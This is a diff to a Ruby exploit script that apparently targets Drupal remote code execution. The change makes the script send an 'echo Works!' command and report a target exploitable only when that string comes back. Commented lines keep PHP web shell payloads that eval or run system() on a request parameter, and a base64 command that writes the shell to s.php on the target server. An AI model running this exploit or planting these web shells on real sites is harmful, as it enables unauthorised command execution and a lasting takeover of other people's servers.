@@ -48,7 +48,7 @@ end
 #evil = '<?php if( isset( $_REQUEST["c"] ) ) { eval( $_GET[c]) ); } ?>'
 # evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
 # evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
-evil = 'id'
+evil = 'echo Works!'
 
 # Feedback
 puts "[*] Target : #{target}"
@@ -159,12 +159,14 @@ req.body = payload
 # Check response
 response = http.request(req)
 if response.code == "200"
-  puts "[+] Target seems to be exploitable! w00hooOO!"
   #puts "[+] Result: " + JSON.pretty_generate(JSON[response.body])
   result = drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
-  puts "[+] Result: #{result}"
-else
-  puts "[!] Target does NOT seem to be exploitable ~ Response: #{response.code}"
+  if result.include? "Works!"
+    puts "[+] Target seems to be exploitable! w00hooOO!"
+    puts "[+] Result: #{result}"
+  else
+    puts "[!] Target does NOT seem to be exploitable ~ Response: #{response.code}"
+  end
 end
 puts "-"*80
 
